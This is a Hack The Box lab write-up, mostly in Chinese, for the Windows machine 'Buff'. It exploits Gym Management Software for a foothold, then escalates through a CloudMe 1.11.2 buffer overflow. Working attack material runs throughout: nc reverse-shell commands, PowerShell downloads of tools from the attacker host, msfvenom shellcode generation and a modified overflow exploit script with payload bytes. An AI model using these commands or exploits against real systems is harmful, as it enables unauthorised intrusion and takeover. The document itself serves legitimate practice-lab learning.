###### tags: `Hack the box` `HTB` `Easy` `Windows`

# Buff
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.79.2 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.79.2:8080

PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: mrb3n's Bro Hut
```

前往8080port的`http://10.129.20.224:8080/contact.php`可以看到
```
mrb3n's Bro Hut
Made using Gym Management Software 1.0 
```

搜尋[edb-48506](https://www.exploit-db.com/exploits/48506)，直接用，但這個shell啥都不能做，`certutil.exe`也不能用，改用`smbserver`下載`nc.exe`
```
┌──(kali㉿kali)-[~/htb]
└─$ python 48506.py http://10.129.20.224:8080/

┌──(kali㉿kali)-[~/htb]
└─$ impacket-smbserver -smb2support -user user -password user share .

C:\xampp\htdocs\gym\upload> net use \\10.10.14.55 user /u:user

C:\xampp\htdocs\gym\upload> copy \\10.10.14.55\share\nc.exe .

 1 file(s) copied.
```

`kali`開`nc`後使用，在`C:\Users\shaun\Desktop`可得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

C:\xampp\htdocs\gym\upload> nc.exe 10.10.14.55 4444 -e cmd

C:\Users\shaun\Desktop>type user.txt
4ad27cdf37cd21ce72df7d66156c422f
```

用winpeas
```
C:\Users\shaun\Desktop>powershell -ep bypass

PS C:\Users\shaun\Desktop> iwr http://10.10.14.55/winPEASx64.exe -Outfile winPEAS.exe

PS C:\Users\shaun\Desktop> .\winPEAS.exe

����������͹ Current TCP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                  
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         936             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         6752            svchost
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         8760            C:\xampp\apache\bin\httpd.exe
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         512             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1072            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1692            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         2140            spoolsv
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         656             services
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         672             lsass
  TCP        10.129.20.224         139           0.0.0.0               0               Listening         4               System
  TCP        10.129.20.224         8080          10.10.14.55           54862           Established       8760            C:\xampp\apache\bin\httpd.exe
  TCP        10.129.20.224         49677         10.10.14.55           4444            Established       2500            C:\xampp\htdocs\gym\upload\nc.exe
  TCP        10.129.20.224         49685         10.10.14.55           445             Established       4               System
  TCP        127.0.0.1             3306          0.0.0.0               0               Listening         8828            C:\xampp\mysql\bin\mysqld.exe
  TCP        127.0.0.1             8888          0.0.0.0               0               Listening         3924            CloudMe
```

發現有8888port的`CloudMe`，搜尋[edb-48389](https://www.exploit-db.com/exploits/48389)且在`C:\Users\shaun\Downloads`可看到版本`1.11.2`
```
C:\Users\shaun\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  13:27    <DIR>          .
14/07/2020  13:27    <DIR>          ..
16/06/2020  16:26        17,830,824 CloudMe_1112.exe
```

開啟`ligolo-ng`
```
┌──(kali㉿kali)-[~/ligolo-ng]
└─$ sudo ip tuntap add user kali mode tun ligolo

┌──(kali㉿kali)-[~/ligolo-ng]
└─$ sudo ip link set ligolo up

┌──(kali㉿kali)-[~/ligolo-ng]
└─$ ./proxy -selfcert
```

下載`agent`執行
```
PS C:\Users\shaun\Downloads> iwr http://10.10.14.55/agent_w.exe -Outfile agent.exe

PS C:\Users\shaun\Downloads> ./agent -connect 10.10.14.55:11601 -ignore-cert

ligolo-ng » session
[Agent : BUFF\shaun@BUFF] » start
[Agent : BUFF\shaun@BUFF] » ifconfig
┌───────────────────────────────────────────────────┐
│ Interface 0                                       │
├──────────────┬────────────────────────────────────┤
│ Name         │ Ethernet0                          │
│ Hardware MAC │ 00:50:56:b0:1b:23                  │
│ MTU          │ 1500                               │
│ Flags        │ up|broadcast|multicast|running     │
│ IPv6 Address │ dead:beef::176/128                 │
│ IPv6 Address │ dead:beef::18c9:1490:f410:4a9e/64  │
│ IPv6 Address │ dead:beef::b083:5f11:74d6:8bdc/128 │
│ IPv6 Address │ fe80::18c9:1490:f410:4a9e/64       │
│ IPv4 Address │ 10.129.47.237/16                   │
└──────────────┴────────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 1                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘
```

把`240.0.0.1`加進來
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo ip route add 240.0.0.1/32 dev ligolo
```

開好nc
```
┌──(kali㉿kali)-[~/htb]
└─$ msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.55 4445 -e powershell' -b '\x00\x0A\x0D' -f python

┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4445
```

把exploit改好
```python
## exploit

import socket

target = "240.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload    = b""
payload   += b"\xba\x76\xd7\x38\x45\xda\xc6\xd9\x74\x24\xf4\x5e"
payload   += b"\x29\xc9\xb1\x3f\x31\x56\x13\x83\xee\xfc\x03\x56"
payload   += b"\x79\x35\xcd\xb9\x6d\x3b\x2e\x42\x6d\x5c\xa6\xa7"
payload   += b"\x5c\x5c\xdc\xac\xce\x6c\x96\xe1\xe2\x07\xfa\x11"
payload   += b"\x71\x65\xd3\x16\x32\xc0\x05\x18\xc3\x79\x75\x3b"
payload   += b"\x47\x80\xaa\x9b\x76\x4b\xbf\xda\xbf\xb6\x32\x8e"
payload   += b"\x68\xbc\xe1\x3f\x1d\x88\x39\xcb\x6d\x1c\x3a\x28"
payload   += b"\x25\x1f\x6b\xff\x3e\x46\xab\x01\x93\xf2\xe2\x19"
payload   += b"\xf0\x3f\xbc\x92\xc2\xb4\x3f\x73\x1b\x34\x93\xba"
payload   += b"\x94\xc7\xed\xfb\x12\x38\x98\xf5\x61\xc5\x9b\xc1"
payload   += b"\x18\x11\x29\xd2\xba\xd2\x89\x3e\x3b\x36\x4f\xb4"
payload   += b"\x37\xf3\x1b\x92\x5b\x02\xcf\xa8\x67\x8f\xee\x7e"
payload   += b"\xee\xcb\xd4\x5a\xab\x88\x75\xfa\x11\x7e\x89\x1c"
payload   += b"\xfa\xdf\x2f\x56\x16\x0b\x42\x35\x7c\xca\xd0\x43"
payload   += b"\x32\xcc\xea\x4b\x62\xa5\xdb\xc0\xed\xb2\xe3\x02"
payload   += b"\x4a\x4c\xae\x0f\xfa\xc5\x77\xda\xbf\x8b\x87\x30"
payload   += b"\x83\xb5\x0b\xb1\x7b\x42\x13\xb0\x7e\x0e\x93\x28"
payload   += b"\xf2\x1f\x76\x4f\xa1\x20\x53\x0c\x7f\x83\x24\xf2"
payload   += b"\x12\x4b\xa5\xa8\x84\xdf\x21\x3e\x37\x53\xf6\xa7"
payload   += b"\xce\xfe\x5a\x5d\x40\x6d\x0c\xfc\xc4\x31\xbc\x9d"
payload   += b"\x2a\xaf\x38\x07\x12\x1e\x89\xe9\x63\x50\xc7\xc4"
payload   += b"\xb7\xbe\x22\x12\x97\x8a\x78\x68\xe2\xd2\xad\xf5"
payload   += b"\x2c\x63\xc1\x82\x49\xf1\x6e\x05\xf4\x99\xfc\xd5"
...
```

執行exploit，可得administrator的shell，在`C:\Users\Administrator\Desktop`得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ python 48389.py 

PS C:\Users\Administrator\Desktop> type root.txt
a1a3b588857e195f6010aa54ad7db1de
```